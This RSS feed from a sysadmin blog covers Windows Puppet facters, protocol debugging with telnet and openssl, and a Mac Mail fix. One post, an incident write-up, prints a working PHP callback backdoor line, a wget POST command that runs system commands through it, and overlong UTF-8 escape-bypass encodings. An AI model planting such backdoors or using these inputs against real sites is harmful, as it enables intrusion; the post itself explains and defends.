<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Greyhat.dk</title>
    <link>https://www.greyhat.dk/</link>
    <description>Recent content on Greyhat.dk</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 25 Oct 2014 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://www.greyhat.dk/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Creating facters on Windows</title>
      <link>https://www.greyhat.dk/creating-facters-windows/</link>
      <pubDate>Sat, 25 Oct 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/creating-facters-windows/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve done automation with puppet for nearly 3 years on Linux but
recently I have been tasked (work) with some automation on Windows. To
tell you the truth I&amp;rsquo;m not exactly a fan of windows and never will be
but I like a challenge.&lt;/p&gt;

&lt;p&gt;But for this particular tasks I needed a list of logical drives and a
list of network adaptors and I couldn&amp;rsquo;t find anyone who had already
created these facters.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://puppetlabs.com/&#34; title=&#34;Puppetlabs&#34;&gt;Puppetlabs&lt;/a&gt; contains a lot of resources when
it comes to Linux but almost none for Windows. It took me a while before
I finally found something I could use so I&amp;rsquo;d like to share what I found.&lt;/p&gt;

&lt;p&gt;WMI (Windows Management Instrumentation) provides a interface to a lot
of resources on a host. Microsoft made their WMI classes public
available at their
site &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa389273(v=vs.85).aspx&#34; title=&#34;MSDN&#34;&gt;Microsoft&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After finding the right WMI class a simple powershell script can test
the query before we put it in a facter.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    PS C:\Users\Administrator&amp;gt; $q = &#39;Win32_NetworkAdapter where AdapterType=&amp;quot;Ethernet 802.3&amp;quot; and Speed &amp;gt; 100&#39;
    PS C:\Users\Administrator&amp;gt; Get-WmiObject $q


    ServiceName      : vmxnet3ndis6
    MACAddress       : 00:50:xx:xx:xx:xx
    AdapterType      : Ethernet 802.3
    DeviceID         : 10
    Name             : vmxnet3 Ethernet Adapter
    NetworkAddresses :
    Speed            : 10000000000

    ServiceName      : vmxnet3ndis6
    MACAddress       : 00:50:xx:xx:xx:xx
    AdapterType      : Ethernet 802.3
    DeviceID         : 14
    Name             : vmxnet3 Ethernet Adapter #2
    NetworkAddresses :
    Speed            : 10000000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above gives a list of all ethernet adapters using
&lt;a href=&#34;http://en.wikipedia.org/wiki/IEEE_802.3&#34; title=&#34;IEEE 802.3 on wikipedia&#34;&gt;802.3&lt;/a&gt;. So next we can
transfer this to facters.&lt;/p&gt;

&lt;p&gt;Get all 802.3 network adapters:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;    require &#39;facter/util/wmi&#39;

    Facter.add(:networkadapters) do
         confine :kernel =&amp;gt; %{windows}
         setcode do
            require &#39;facter/util/wmi&#39;
            adapters = []

         Facter::Util::WMI.execquery(&amp;quot;select * from Win32_NetworkAdapter where AdapterType=&#39;Ethernet 802.3&#39; and Speed &amp;gt; 100&amp;quot;).each do |ole|
                adapters.push(&amp;quot;#{ole.Name}&amp;quot;)
             end
            adapters.sort.join(&#39;,&#39;)
         end
    end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Get all logical (local) drives:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;    require &#39;facter/util/wmi&#39;

    Facter.add(:logical_drives) do
         confine :kernel =&amp;gt; %{windows}
         setcode do
            require &#39;facter/util/wmi&#39;
            drives = []

         Facter::Util::WMI.execquery(&amp;quot;select * from Win32_LogicalDisk where DriveType=3&amp;quot;).each do |ole|
                drives.push(&amp;quot;#{ole.DeviceID}&amp;quot;)
             end
            drives.sort.join(&#39;,&#39;)
         end
    end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;How and where facters are put on the Puppet Enterprise installation is
beyond the scope of this post and can easily be found at
&lt;a href=&#34;http://puppetlabs.com/&#34; title=&#34;Puppetlabs&#34;&gt;Puppetlabs&lt;/a&gt; website.&lt;/p&gt;

&lt;p&gt;The above was tested on a Windows 2012 (64bit) using PE 3.3.x&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PHP callback function backdoor</title>
      <link>https://www.greyhat.dk/php-callback-function-backdoor/</link>
      <pubDate>Sat, 10 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/php-callback-function-backdoor/</guid>
      <description>&lt;p&gt;I recently had an incident at a customers website where the site was
compromised. The customer went through the code and found several SQL
injections, XSS and newly added files with backdoors (basic evals in
PHP). All vulnerabilities was fixed (According to the customer) but
about a month later the site was compromised again. Unfortunately no
version control was used so we had to go through all files to help the
customer and the log had no indications of successful attempts.&lt;/p&gt;

&lt;p&gt;In several files I found code like this&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    @array_diff_ukey(@array((string)$_REQUEST[&#39;list&#39;]=&amp;gt;1), @array((string)stripslashes($_REQUEST[&#39;list2&#39;])=&amp;gt;2),$_REQUEST[&#39;var&#39;]);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It took me a while to fully understand what this is. This is a quite
clever backdoor and the reason why its was not detected in apaches log
is that POST was used to execute the command for compromising.&lt;/p&gt;

&lt;p&gt;So in order to execute a command on the system all the attacker had to
  do was&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ wget -S -O - --post-data &#39;var=system&amp;amp;list=ls&#39; http://example.com/g.php --2014-05-10 14:23:45-- http://example.com/g.php Resolving example.com... 127.0.0.1 Connecting to example.com|127.0.0.1|:80... connected. HTTP request sent, awaiting response... HTTP/1.1 200 OK Date: Sat, 10 May 2014 12:23:45 GMT Server: Apache Connection: close Content-Type: text/html Length: unspecified [text/html] Saving to: &#39;STDOUT&#39; 
    [&amp;lt;=&amp;gt; ] 0 --.-K/s
    cv.pdf
    g.php
    index.html
    index5.html
    [ &amp;lt;=&amp;gt; ] 79 --.-K/s in 0s
    2014-05-10 14:23:45 (428 KB/s) - written to stdout [79]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nice directory listing :) I&amp;rsquo;m pretty sure you can find alternative ways
to use this then listing files. But since the customer did not find this
backdoor using a review it really proves a few things.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Always use version control on your software (Subversion, Git etc)&lt;/li&gt;
&lt;li&gt;Always sanitize input&lt;/li&gt;
&lt;li&gt;Hire developers who knows the current languages pitfalls, know how to
review code.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Another thing I found was a heavy usage of the php function
mysql_real_escape_string. The function does not provide any real
security since it does not handle overlong UTF-8 chars.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    &#39; = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7 
    &amp;quot; = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2 
    &amp;lt; = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
    ; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb 
    &amp;amp; = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6 
    \0= % 00 = %c0%80 = %e0%80%80 = %f0%80%80%80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Missing unread mail count in the dock on Mac OS X 10.9 (Mavericks)</title>
      <link>https://www.greyhat.dk/missing-unread-mail-count-in-the-doc-on-mac-os-x-10-9-mavericks/</link>
      <pubDate>Thu, 08 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/missing-unread-mail-count-in-the-doc-on-mac-os-x-10-9-mavericks/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve had plenty of issues with mail in Mac OS X but most of them have
been related to the poor implementation of the integration with
Exchange. But I have finally found a solution for one specific problem.
That is the missing unread count in the dock.&lt;/p&gt;

&lt;p&gt;This is how I fixed it. Quit mail entirely and run from a command prompt&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # mv ~/Library/Mail/V2/MailData/Envelope* ~/Desktop/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not open mail once again and it will do a import of all mails (Took
about 2 hours on my machine but it depends on how many mails and mail
accounts you have).&lt;/p&gt;

&lt;p&gt;Once verified that this works for you, you are safe to delete the
Evelope files placed on your desktop.&lt;/p&gt;

&lt;p&gt;If this still does not work I&amp;rsquo;d bet you forgot to add mail to the
notification bar like this: Go to System Preferences &amp;gt; Notifications &amp;gt;
Mail, and make sure that the &amp;ldquo;Badge app icon&amp;rdquo; box is checked.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The lost art of debugging for admins #part 2 – Basic knowledge of protocols</title>
      <link>https://www.greyhat.dk/the-lost-art-of-debugging-for-admins-part-2-basic-knowledge-of-protocols/</link>
      <pubDate>Fri, 03 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/the-lost-art-of-debugging-for-admins-part-2-basic-knowledge-of-protocols/</guid>
      <description>

&lt;h1 id=&#34;protocols:09039365d17ddb1c7e3b882473b1c5bd&#34;&gt;Protocols&lt;/h1&gt;

&lt;p&gt;Just a little knowledge about a few protocols can get you a long way
when debugging. Often, clients does not give the full feedback from the
server or tries to give a user-friendly error message which just makes
it worse. Here is how just a handfuld of protocols can be used using
telnet/openssl&lt;/p&gt;

&lt;h1 id=&#34;http-https:09039365d17ddb1c7e3b882473b1c5bd&#34;&gt;HTTP/HTTPS&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ telnet www.example.com 80
    Connected to www.example.com.
    Escape character is &#39;^]&#39;.
    GET / HTTP/1.1
    HOST: www.example.com
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4

    HTTP/1.1 302 Found
    Date: Mon, 18 Nov 2013 19:32:49 GMT
    Server: Apache
    Location: https://www.example.com/
    Content-Length: 206
    Connection: close
    Content-Type: text/html; charset=iso-8859-1302 Found

    &amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;
    &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;
    &amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;Found&amp;lt;/h1&amp;gt;
    &amp;lt;p&amp;gt;The document has moved &amp;lt;a href=&amp;quot;https://www.example.com/index.htm&amp;quot;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
    &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
    Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ openssl s_client -connect www.example.com:443
    CONNECTED(00000003)
    ---
    Lots of SSL certificate stuff removed
    ---

    GET / HTTP/1.1
    HOST: www.example.com

    HTTP/1.1 200 OK
    Date: Mon, 18 Nov 2013 19:37:18 GMT
    Server: Apache
    Last-Modified: Tue, 29 Jan 2013 07:51:17 GMT
    ETag: &amp;quot;e83f7c0-1e8-4d468a89c0237&amp;quot;
    Accept-Ranges: bytes
    Content-Length: 488
    Connection: close
    Content-Type: text/html&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=iso-8859-1&amp;quot; /&amp;gt;&amp;lt;meta name=&amp;quot;Description&amp;quot; content=&amp;quot;www.example.com: My private homepage&amp;quot; /&amp;gt;Example.com
    &amp;lt;link href=&amp;quot;/styles-site.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; /&amp;gt;&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
    &amp;lt;div&amp;gt;

    Example.com test site

    &amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;pop3-pop3s:09039365d17ddb1c7e3b882473b1c5bd&#34;&gt;POP3/POP3S&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ telnet example.com 110
    Connected to example.com.
    Escape character is &#39;^]&#39;.
    +OK Yes master.
    user user@example.com
    +OK
    pass secret
    +OK Logged in.
    list
    +OK 2 messages:
    1 2001
    2 1863
    stat
    +OK 2 14989176
    retr 2
    +OK 12138 octets
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just like the example with https the openssl client works for POP3&lt;/p&gt;

&lt;h1 id=&#34;imap-imaps:09039365d17ddb1c7e3b882473b1c5bd&#34;&gt;IMAP/IMAPS&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ telnet example.com 143
    Connected to example.com.
    Escape character is &#39;^]&#39;.
    * OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE STARTTLS AUTH=PLAIN] Yes master.
    A001 LOGIN user@example.com secret
    A001 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT IDLE CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS] Logged in
    A002 LIST &amp;quot;&amp;quot; &amp;quot;*&amp;quot;
    * LIST (\HasChildren) &amp;quot;.&amp;quot; &amp;quot;INBOX&amp;quot;
    * LIST (\HasNoChildren) &amp;quot;.&amp;quot; &amp;quot;INBOX.Drafts&amp;quot;
    * LIST (\HasNoChildren) &amp;quot;.&amp;quot; &amp;quot;INBOX.Junk&amp;quot;
    * LIST (\HasNoChildren) &amp;quot;.&amp;quot; &amp;quot;INBOX.Sent&amp;quot;
    * LIST (\HasNoChildren) &amp;quot;.&amp;quot; &amp;quot;INBOX.Trash&amp;quot;
    A002 OK List completed.
    A003 EXAMINE INBOX
    * FLAGS (\Answered \Flagged \Deleted \Seen \Draft Junk NonJunk $label1 $label4 $label2 $label3 $label5 $MDNSent $Forwarded $NotJunk $Junk JunkRecorded receipt-handled $MailFlagBit0 $MailFlagBit1)
    * OK [PERMANENTFLAGS ()] Read-only mailbox.
    * 2 EXISTS
    * 0 RECENT
    * OK [UNSEEN 1] First unseen.
    * OK [UIDVALIDITY 1214564994] UIDs valid
    * OK [UIDNEXT 39761] Predicted next UID
    * OK [HIGHESTMODSEQ 35521] Highest
    A003 OK [READ-ONLY] Select completed.
    A004 FETCH 1 BODY[]
    * 1 FETCH (BODY[] {2001}
    ..
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;smtp-smtps:09039365d17ddb1c7e3b882473b1c5bd&#34;&gt;SMTP/SMTPS&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ telnet example.com 25
    Trying 192.168.1.1...
    Connected to example.com.
    Escape character is &#39;^]&#39;.
    220 example.com ESMTP
    ehlo example.com
    250-example.com
    250-PIPELINING
    250-SIZE
    250-ETRN
    250-STARTTLS
    250-AUTH PLAIN LOGIN
    250-AUTH=PLAIN LOGIN
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250 DSN
    mail from:&amp;lt;whomever@example.com&amp;gt;
    250 2.1.0 Ok
    rcpt to:&amp;lt;user@example.com&amp;gt;
    250 2.1.5 Ok
    data
    354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
    Subject: Testing
    Test test
    .
    250 2.0.0 Ok: queued as 2DAB5C13D8A
    quit
    221 2.0.0 Bye
    Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;tips-on-reading-creating-emails:09039365d17ddb1c7e3b882473b1c5bd&#34;&gt;Tips on reading/creating emails&lt;/h1&gt;

&lt;p&gt;Attached files are added as mime-encoded base64 blocks like so&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    Return-Path: &amp;lt;user@example.com&amp;gt;
    X-Original-To: user@example.com
    Delivered-To: user@example.com
    Received: from [192.168.1.1] (example.com [192.168.1.1])
        (using TLSv1 with cipher AES128-SHA (128/128 bits))
        (No client certificate requested)
        (Authenticated sender: user@example.com)
        by example.com (Postfix) with ESMTPSA id 13398C13CE4
        for &amp;lt;user@example.com&amp;gt; Fri,  3 Jan 2014 13:01:22 +0100 (CET)
    From: Example User &amp;lt;user@example.com&amp;gt;
    Content-Type: image/png; x-mac-hide-extension=yes; x-unix-mode=0644; name=&amp;quot;dot.png&amp;quot;
    Content-Transfer-Encoding: base64
    Subject: img
    Message-Id: &amp;lt;470CCFDB-8106-4F2A-8BB3-ED4765D45551@example.com&amp;gt;
    Date: Fri, 3 Jan 2014 13:01:25 +0100
    To: Example User &amp;lt;user@example.com&amp;gt;
    Mime-Version: 1.0 (Mac OS X Mail 7.1 \(1827\))
    Content-Disposition: inline; filename=dot.png
    X-Mailer: Apple Mail (2.1827)

    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
    1Y/YjpwY9R29/nzB8+EX4hcTLwv+Uvyr6pXxq+N/M//uGYsdG34teT35pvit2tu6d/bvusbDxh+/
    z3g/8aHwo9rHA58Yn7o/x3x+NrHsC+5L+VeTrx3fAr89nMyYnBRzJJzpXACFtHByMgBv6gCgxAFA
    vY7kC3IzefG0BTSTyyMMfa9T8n/xTO48NYDkEKCOCUA0goF5AOzrBMAA6YlIH8YEIJIJYDs7WQUz
    JTPZznaaIFIrkpqUTU6+RfJBnAkAX/snJydaJye/1iL5+30AOt/P5ONT1gqHAGDmsXxDgq4qKs04
    +kf7H19W/ovOQJzqAAABm2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxu
    czp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNS40LjAiPgogICA8cmRmOlJE
    RiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMi
    PgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpl
    eGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVs
    WERpbWVuc2lvbj4yMTwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVs
    WURpbWVuc2lvbj4yMjwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0
    aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgrUWcUnAAAB5ElEQVQ4EWNgGAUDGQKMRFiu
    El8ewfNw+9QVZyGKVdxT0wLNxTgY3j88z0KEfinXAG/lhwwQ/SoBjTPL3bgYfr5/z6CuwEKM/q8/
    fjL8/PMbYpNviD3Xz7sNDjE7wXwW49T+rgjJXSuumER4yHAxf354uCWi7BBIzq5xTq69hgzQBmZm
    hm8gEeOACB05bpa/758JBkSk8rPfPLqQWdU+0stAWcNQjfHZuVNPmVRVtQ3V/yzf/bVt9WQXFYGn
    53btPvNMXEOe4/2NBW+UZtTEKPAwMfHIW9hYGJqYyP25DXX/+6sbvFI6gTYsODBFRU5WJT7fUYb5
    4a7OiPoNQEFtT1tBoPWHOh0sO8uXHPBl2W4TAVQMAkxg8ufB6RA+9x8g/89vKSGg+r9X9gI1QwFI
    HBuA6IfJGBvLsTN8ev8OaAZI6CuIUIkPV2Fn+AtiYgEQ97NIWAS4qyompobxMrxfsmD2VwtzYKjp
    J5TH20nEhVmwMzB8w+EAiH5mi5hyC6DpP9/smtEwFZhMzk4/7NBraxKQYcLw5Mzh51q2kgy/ILZD
    KbhT7AoXHD9+oDHAWMVYBS4IYdi5B9gZo4mhc1kY2IBOYPn97uwdaOpEqDi0ExF+CFFUFsuzm2cv
    Xn125Rmq8IjhAQApUJ8sKnhyuAAAAABJRU5ErkJggg==
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the base64 encoded block to a file and decode it&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    openssl base64 -d &amp;lt; dot_png.base64 &amp;gt; dot.png
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or manually encode a file/text&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    openssl base64 -e &amp;gt; dot.png &amp;lt; dot_png.base64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All of the above is also used for penetration testing since you can test
for open relays, test for users, brute force attacks or looking for
version numbers (Just automate it with expect or netcat).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The lost art of debugging for admins #part 1 - Basics and ptrace</title>
      <link>https://www.greyhat.dk/the-lost-art-of-debugging-for-admins-part-1-basics-and-ptrace/</link>
      <pubDate>Fri, 26 Jul 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/the-lost-art-of-debugging-for-admins-part-1-basics-and-ptrace/</guid>
      <description>

&lt;h1 id=&#34;basics:1d4aff1a42a09f40496282ff08e8849d&#34;&gt;Basics&lt;/h1&gt;

&lt;p&gt;Its been a while since my last update. Been quite busy but also because
I didn&amp;rsquo;t have anything to add. But lately I&amp;rsquo;ve have a urge to write a
series on how to debug on Linux (Works on other platforms as well).
Mostly because it seems that the younger generation (And even older) no
longer debugs their problems but just seek the nearest forum so see if
anyone else had the same issue.&lt;/p&gt;

&lt;p&gt;First rule of debugging is: check logs or use verbose options.&lt;/p&gt;

&lt;p&gt;Once that fails (Many programs have poor logging or inadequate
verbosity) you need to start looking at what the program actually does.
You could just use the &amp;ldquo;look at the source Luuk&amp;rdquo; but for several reasons
that might not be an option.&lt;/p&gt;

&lt;p&gt;| 1) Looking though the source code is one thing, the other is
  understanding it (And you might not be familiar with the language or
  even be a programmer). Its quite time consuming and we all know once
  something stopped working we all have a CEO/Customer on our back.
|  2) Closed source will prevent you from looking at the source code
  (Almost)&lt;/p&gt;

&lt;p&gt;So back to basics on how programs actually work. Programs call software
interrups. Its as simple as that .. lets examine that (You don&amp;rsquo;t need to
be a programmer to understand this).&lt;/p&gt;

&lt;p&gt;A simple Hello world program (Written in 32bit assembly language to keep
the calls to the kernel clean) to demonstrate it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;    .data 

    HelloWorldString:
        .ascii &amp;quot;Hello World\n&amp;quot;

    .text 

    .globl _start 
